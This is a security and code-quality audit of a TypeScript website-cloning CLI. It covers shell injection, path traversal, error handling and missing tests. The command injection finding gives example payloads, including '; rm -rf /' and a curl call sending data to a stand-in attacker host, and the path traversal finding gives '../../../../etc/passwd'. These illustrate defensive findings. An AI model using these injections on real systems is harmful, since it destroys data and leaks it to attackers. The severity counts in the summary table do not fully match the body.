# Codebase Concerns

**Analysis Date:** 2026-04-28

## Critical Issues

### Command Injection via Shell Spawning

**Issue:** Shell interpolation in spawn() with user-controlled input

- **Files:** `packages/cli/src/clone/verify.ts` (line 261)
- **Severity:** Critical
- **Problem:** `spawn(cmd, { cwd, stdio: 'ignore', shell: true })` with `cmd` parameter that could contain unsanitized input. The `shell: true` flag enables shell interpretation of metacharacters.
- **Impact:** If `cmd` is derived from user input (page slugs, branch names), an attacker could inject shell commands like `; rm -rf /` or `| curl attacker.com?data=...`.
- **Current mitigation:** Limited — the function is internal but dangerous. Page slugs are user input via CLI flags.
- **Recommendations:** 
  1. Remove `shell: true` and pass arguments as array: `spawn(cmd, [], { cwd, stdio: 'ignore' })`
  2. Validate/sanitize page slugs and branch names before passing to shell operations
  3. Use `shellQuote()` on all interpolated variables in execSync/spawn calls

### Uncaught Promise Rejections in Concurrent Operations

**Issue:** Promise.all() without error handling in concurrent workers

- **Files:** 
  - `packages/cli/src/commands/clone.ts` (line 114)
  - `packages/cli/src/commands/fixes/apply.ts` (line 114)
  - `packages/cli/src/clone/download-missing.ts` (line 140)
- **Severity:** Critical
- **Problem:** `await Promise.all()` without try/catch will fail the entire operation if ANY worker rejects. No partial results are saved.
- **Impact:** 
  - If cloning 10 pages and one fails, the entire operation crashes and loses 9 successful results
  - Download operations fail atomically — no way to know which assets succeeded
- **Current mitigation:** Individual workers have try/catch but Promise.all() itself is unguarded
- **Recommendations:**
  1. Use `Promise.allSettled()` instead to capture both successes and failures
  2. Aggregate results and report what succeeded/failed
  3. For clones specifically, ensure results array survives even if a worker throws before pushing

### Path Traversal Risk in File Operations

**Issue:** User-controlled paths used directly in fs operations

- **Files:** 
  - `packages/cli/src/scaffold/template-writer.ts` (lines 54-75: `copyRecursive`)
  - `packages/cli/src/clone/rewrite-links.ts` (lines 167-190: `walk`)
  - `packages/cli/src/clone/download-missing.ts` (line 140: `downloadMissing`)
- **Severity:** High
- **Problem:** File paths come from Firecrawl results, manifests, and URL parsing. While basic validation exists (skip dirs set, basename extraction), no absolute path boundary checking.
- **Impact:** 
  - Malformed manifest with `localPath: "../../../../etc/passwd"` could write outside the intended client directory
  - URL with `pathname: "../../../evil.jpg"` could create files at arbitrary locations
- **Current mitigation:** 
  - `SKIP_DIRS` set prevents traversing `.git`, `node_modules`
  - `safeFilename()` at line 78-99 sanitizes downloaded asset names
  - `basename()` used to extract filename from URLs
- **Recommendations:**
  1. Resolve all paths with `resolve()` then assert they're within expected bounds using `relative()` check
  2. Validate manifests on load — reject entries with `..` in localPath
  3. For downloads, use `path.resolve(outDir, filename)` then verify result starts with `outDir`

### Hardcoded Credentials in Git Commits

**Issue:** Bot credentials in git config

- **Files:** `packages/cli/src/commands/clone.ts` (lines 416-417), `packages/cli/src/commands/fixes/apply.ts` (lines 312-313)
- **Severity:** Medium (but avoidable)
- **Problem:** Email and name hardcoded as `"upriver@lifeupriver.com"` and `"Upriver Bot"` in every git scaffold/commit operation. Not a secret but should use env config.
- **Impact:** Commits are attributed to a bot account that's baked into the codebase.
- **Recommendations:**
  1. Move to config file or env var `UPRIVER_GIT_EMAIL` / `UPRIVER_GIT_NAME`
  2. Fall back to user's global git config if not set

---

## High Severity Issues

### Weak Error Handling in Async Operations

**Issue:** Silent catch blocks swallowing errors

- **Files:** 
  - `packages/core/src/firecrawl/client.ts` (line 63: `catch { // non-fatal }`)
  - `packages/cli/src/clone/rewrite-links.ts` (line 56, 125: `catch { // skip malformed URLs }`)
  - `packages/cli/src/clone/download-missing.ts` (line 70, 82, 134: bare catches)
  - `packages/audit-passes/src/competitors/index.ts` (line 50: `catch { /* skip malformed */ }`)
- **Severity:** High
- **Problem:** Catch blocks with no logging or context. Future maintainers won't know what failed or why.
- **Impact:** 
  - Difficult debugging — silent failures compound into confusing downstream errors
  - No observability into which operations are failing at scale
  - Potential data loss if critical operations fail without notice
- **Current mitigation:** Comments indicate intent but no actual logging
- **Recommendations:**
  1. Add debug-level logging to every catch: `console.debug(`Failed to parse URL: ${url}`, err)`
  2. Aggregate error counts and report summaries at end of commands
  3. For firecrawl credit logging, log to the credit log on failure as well

### Unvalidated JSON Parsing

**Issue:** JSON.parse() on external data without schema validation

- **Files:** 
  - `packages/cli/src/commands/scrape.ts` (lines 322, 357, 406: parse firecrawl JSON)
  - `packages/audit-passes/src/schema/index.ts` (line 13: parse JSON-LD)
  - `packages/core/src/gsc/client.ts` (line 34: parse service account key)
- **Severity:** High
- **Problem:** Parsed JSON is immediately cast to expected type without validation. If Firecrawl returns unexpected schema or API changes, type coercion fails silently.
- **Impact:** 
  - `existing.extracted.ctaButtons` (line 326) assigned `unknown[]` and never validated
  - Page data corruption if Firecrawl API changes field types
  - JSON-LD parsing (line 13) catches parse errors but doesn't validate schema structure
- **Current mitigation:** Try/catch around JSON.parse, but no schema validation after parse
- **Recommendations:**
  1. Use Zod or similar schema validator: `PageRecordSchema.parse(JSON.parse(...))`
  2. Create strict types for all external API responses (Firecrawl, GSC, Ahrefs)
  3. In scrape.ts, validate extracted data schema before assignment

### Missing Test Coverage

**Issue:** Zero test files in the codebase

- **Files:** No `.test.ts`, `.spec.ts`, or test directory found
- **Severity:** High
- **Problem:** 
  - Complex business logic in rewrite-links.ts (regex patterns for URL rewriting) untested
  - File path manipulation in template-writer.ts (recursive copy) untested
  - Concurrent worker patterns in clone.ts untested
- **Impact:** 
  - Regressions are discovered in production (customer sites)
  - Refactoring is risky — no safety net
  - Edge cases in URL rewriting (nested paths, query strings, CDN hosts) not validated
- **Recommendations:**
  1. Add Jest/Vitest config to monorepo root
  2. Start with critical paths: `rewrite-links.ts` (URL rewriting), `clone.ts` (concurrent logic), GSC/Firecrawl clients
  3. Set 70%+ coverage goal on core packages (cli, core); accept lower on audit-passes

### Environment Variable Handling

**Issue:** Missing env vars cause confusing errors

- **Files:** 
  - `packages/core/src/gsc/client.ts` (line 29-31: `GOOGLE_SERVICE_ACCOUNT_KEY` throws if missing)
  - `packages/core/src/usage/logger.ts` (line 29-30: `UPRIVER_SUPABASE_URL` silently ignored if missing)
  - `packages/cli/src/base-command.ts` (line 11: generic `process.env[name]` lookup)
- **Severity:** High
- **Problem:** Inconsistent error handling for missing config. Some throw, some silently degrade.
- **Impact:** User sees cryptic "GOOGLE_SERVICE_ACCOUNT_KEY env var is not set" but doesn't know where to set it or what format it expects.
- **Recommendations:**
  1. Create a `config/env-schema.ts` that defines all required/optional vars with descriptions
  2. Validate all env vars on CLI startup (base-command.ts)
  3. Provide helpful error messages: `GOOGLE_SERVICE_ACCOUNT_KEY must be a path to a JSON service account file. See docs/setup.md`

---

## Medium Severity Issues

### TODO: Incomplete Ahrefs API Integration

**Issue:** Stub implementation for Ahrefs API

- **Files:** `packages/audit-passes/src/backlinks/index.ts` (line 79: `// TODO: Implement Ahrefs API v3 integration`)
- **Severity:** Medium
- **Problem:** When `AHREFS_API_KEY` is set, the function returns a placeholder response instead of calling the actual API.
- **Impact:** Users set the API key but get no actual backlink analysis. They assume it works but it doesn't.
- **Recommendations:**
  1. Implement the API call: `GET https://api.ahrefs.com/v3/site-explorer/overview`
  2. Or remove the TODO and make it clear the feature isn't available yet
  3. Add a warning log if API key is set but integration isn't enabled

### Unbound Concurrency in Downloads

**Issue:** Concurrent download operations without connection pooling

- **Files:** `packages/cli/src/clone/download-missing.ts` (line 115: `concurrency: 8`)
- **Severity:** Medium
- **Problem:** Each worker spawns an independent fetch() call. No connection pooling or rate limiting per host. Could DOS or get IP-banned.
- **Impact:** 
  - If cloning a site with 1000 images, 8 concurrent fetches burst from single IP
  - No backoff on 429 (rate limit) responses
  - Possible resource exhaustion on memory (8 open streams)
- **Current mitigation:** Default concurrency is 8 (reasonable) and users can tune it
- **Recommendations:**
  1. Add exponential backoff on fetch errors
  2. Implement per-host rate limiting (max 2-3 concurrent requests per domain)
  3. Add retry logic for transient failures (5xx, timeout)

### Weak Type Safety with `unknown[]`

**Issue:** Generic `unknown[]` casts without element validation

- **Files:** `packages/cli/src/commands/scrape.ts` (lines 326-333)
- **Severity:** Medium
- **Problem:** 
  ```typescript
  ctaButtons: (j['ctaButtons'] as unknown[]) ?? [],
  ```
  No validation that elements are actually CTA button objects. If Firecrawl returns `{ ctaButtons: "not an array" }`, this silently becomes `[]`.
- **Impact:** 
  - Silent data loss — missing CTAs never surface as an error
  - Downstream assumptions fail (e.g., `.map(cta => cta.text)` would crash if one element is not a CTA object)
- **Recommendations:**
  1. Create type guards: `isCTAButton(x): x is CTAButton { return ... }`
  2. Filter extracted data: `ctaButtons: (j['ctaButtons'] as unknown[])?.filter(isCTAButton) ?? []`
  3. Log warnings for skipped invalid elements

### Command-Line Argument Injection Risk

**Issue:** Branch names derived from user input used in shell commands

- **Files:** `packages/cli/src/commands/clone.ts` (lines 140, 434: branch used in execSync/git commands)
- **Severity:** Medium
- **Problem:** Branch name comes from `pageSlugForBranch(page)` which is derived from the page URL (user-controlled via `--page` flag or audit data).
- **Impact:** If a page slug contains special characters or backticks, could break git commands.
- **Current mitigation:** `shellQuote()` is used in most places but not consistently
- **Recommendations:**
  1. Audit all uses of `shellQuote()` — ensure it's applied to ALL interpolated variables
  2. Replace execSync with explicit argument arrays where possible (git worktree add supports `--` syntax)
  3. Add validation: branch names must match `/^[a-z0-9-]+$/`

### Race Condition in Concurrent Worktree Operations

**Issue:** Concurrent git worktree operations without locking

- **Files:** `packages/cli/src/commands/clone.ts` (lines 429-439: `createWorktree`)
- **Severity:** Medium
- **Problem:** Multiple workers simultaneously calling `git worktree add` on the same repo could race.
- **Impact:** 
  - Worktree creation fails with "branch already exists"
  - Incomplete cleanup on race condition
- **Current mitigation:** `-B` flag (reset branch) helps but doesn't prevent all races
- **Recommendations:**
  1. Add a simple file-based lock before worktree creation
  2. Retry with backoff if `git worktree add` fails (another process may have created it)

---

## Low Severity Issues

### Code Quality & Maintainability

### Large Functions Need Documentation

**Issue:** Functions > 500 lines lack detailed JSDoc

- **Files:** 
  - `packages/cli/src/scaffold/template-writer.ts` (754 lines total, but modular)
  - `packages/cli/src/commands/clone.ts` (655 lines)
  - `packages/cli/src/commands/scrape.ts` (592 lines)
- **Severity:** Low
- **Problem:** Functions are reasonably modular (helper functions) but inline comments are sparse. A new contributor needs to trace logic across many function calls.
- **Recommendations:**
  1. Add JSDoc to helper functions explaining parameter contracts (e.g., what format does `opts` expect?)
  2. Add section comments (e.g., `// ── Phase 1: Collect metadata ────`) at major logic boundaries

### Inconsistent Error Types

**Issue:** Mix of Error, string, and Error-like objects thrown

- **Files:** Various catch blocks access `(err as Error).message`, some use `String(err)`
- **Severity:** Low
- **Problem:** Not all thrown values are Error objects. Inconsistent pattern makes error handling fragile.
- **Recommendations:**
  1. Create a custom error base class: `class UpriverError extends Error { code: string; }`
  2. Always throw Error subclasses, never bare strings
  3. Catch and re-throw with context

### Missing Input Validation on Public APIs

**Issue:** No validation of config file schemas

- **Files:** `packages/cli/src/base-command.ts`, audit command entry points
- **Severity:** Low
- **Problem:** Config files (client-config.yaml, etc.) are parsed but never validated against expected schema.
- **Impact:** Typos in config files cause confusing downstream errors (e.g., `typo_dev_port: 4322` doesn't override default).
- **Recommendations:**
  1. Use YAML schema validation or Zod for config files
  2. Validate on load and provide helpful error messages

### Potential Memory Leaks in Event Listeners

**Issue:** Event listeners not always cleaned up

- **Files:** `packages/cli/src/clone/verify.ts` (line 61: `preview.stdout?.on('data', () => {})`)
- **Severity:** Low
- **Problem:** Anonymous drain listeners on stdout/stderr to prevent buffer backpressure. No explicit cleanup.
- **Impact:** Minor — child process is killed anyway when browser closes, but pattern could leak in other contexts.
- **Recommendations:**
  1. Store listeners in variables: `const onData = () => {}; preview.stdout?.on('data', onData);`
  2. Explicitly remove: `preview.stdout?.off('data', onData)` before kill

### Missing Logging in Critical Paths

**Issue:** No operational logs for debugging production issues

- **Files:** All command files
- **Severity:** Low
- **Problem:** While the CLI logs output to users, there's no structured logging (JSON, timestamps, severity levels) for operators.
- **Impact:** Hard to debug customer issues — can't correlate multiple concurrent operations.
- **Recommendations:**
  1. Use a structured logger (pino, winston) instead of console.log
  2. Emit logs to both stderr (user) and a file (operator)
  3. Include operation IDs (slug, branch) on every log line

---

## Fragile Areas (High Risk of Breakage)

### URL Rewriting Logic

**Files:** `packages/cli/src/clone/rewrite-links.ts`

**Why fragile:** Regex patterns are complex and rely on negative lookahead to prevent matching across URL boundaries. Small changes to input (e.g., unescaped JSON strings in HTML) can break the pattern.

**Safe modification:**
1. Add comprehensive unit tests for the regex patterns (test nested paths, query strings, fragments, CDN URLs with auth, unicode in paths)
2. Add guards: validate input HTML structure before regex operations
3. Keep a test suite of real-world scraped HTML to regression-test against

### Schema Extraction (JSON-LD)

**Files:** `packages/audit-passes/src/schema/index.ts` (line 7-20: `extractJsonLd`)

**Why fragile:** Regex for extracting `<script type="application/ld+json">` content. If HTML is minified or has nested quotes, the regex can break.

**Safe modification:**
1. Parse HTML with cheerio/jsdom instead of regex
2. Add tests for malformed/edge-case JSON-LD (missing closing tags, nested scripts, BOM, comments)

### Concurrent Worker Pattern

**Files:** `packages/cli/src/commands/clone.ts` (lines 92-114), `packages/cli/src/commands/fixes/apply.ts`

**Why fragile:** Shared mutable state (queue, results array) with no synchronization. If a worker throws before pushing result, results array is incomplete.

**Safe modification:**
1. Wrap workers in try/finally to ensure cleanup
2. Use Promise.allSettled() so one failure doesn't kill all workers
3. Add tests for worker failures (intentionally throw in one worker, verify others complete)

---

## Missing Critical Features

### No Graceful Degradation for Missing Dependencies

**Issue:** Playwright optionally installed but verify loop silently skips

- **Files:** `packages/cli/src/clone/verify.ts` (line 42)
- **Severity:** Medium
- **Problem:** If Playwright isn't installed, verification loop skips silently. User doesn't know the visual verification didn't run.
- **Recommendations:**
  1. Add a flag `--require-verify` to fail the operation if Playwright isn't available
  2. Or prompt user: "Playwright not installed. Continue without visual verification? (y/n)"

### No Rate Limiting on Firecrawl API

**Issue:** No backoff or rate limiting for Firecrawl requests

- **Files:** `packages/core/src/firecrawl/client.ts`
- **Severity:** Medium
- **Problem:** If Firecrawl is down or rate-limiting, the client immediately fails with no retry.
- **Impact:** Large sites (50+ pages) might hit rate limits and fail mid-scrape.
- **Recommendations:**
  1. Add exponential backoff: `if (res.status === 429) { wait(2^attempt * 1000ms); retry; }`
  2. Emit credit usage warnings if getting close to daily limits

---

## Configuration Drift

### No Configuration Validation on Startup

**Issue:** Missing config files don't fail gracefully

- **Files:** `packages/cli/src/commands/clone.ts` (line 261), `packages/cli/src/scaffold/template-writer.ts` (line 41)
- **Severity:** Low
- **Problem:** `client-config.yaml` is optional, so missing it returns default values without warning.
- **Impact:** Users might assume config was loaded when it wasn't.
- **Recommendations:**
  1. Warn if config file doesn't exist: `this.warn('client-config.yaml not found, using defaults')`
  2. Log resolved config values on startup for transparency

---

## Summary by Severity

| Severity | Count | Critical Impact Areas |
|----------|-------|----------------------|
| **Critical** | 3 | Shell injection, unhandled promise rejections, path traversal |
| **High** | 5 | Error handling, JSON validation, test coverage, env vars, command injection |
| **Medium** | 6 | Ahrefs stub, download concurrency, type safety, worktree races, feature gaps, rate limiting |
| **Low** | 8 | Code quality, error types, memory leaks, logging, config validation |

**Most Urgent Fixes:**
1. Replace `shell: true` in verify.ts line 261 ✅ Critical security
2. Use `Promise.allSettled()` in clone/fixes/download commands ✅ Data loss prevention
3. Add schema validation for JSON parsing ✅ Data integrity
4. Add test coverage for rewrite-links and clone logic ✅ Regression prevention
5. Implement Ahrefs API or remove the TODO ✅ Feature completeness

---

*Concerns audit: 2026-04-28*
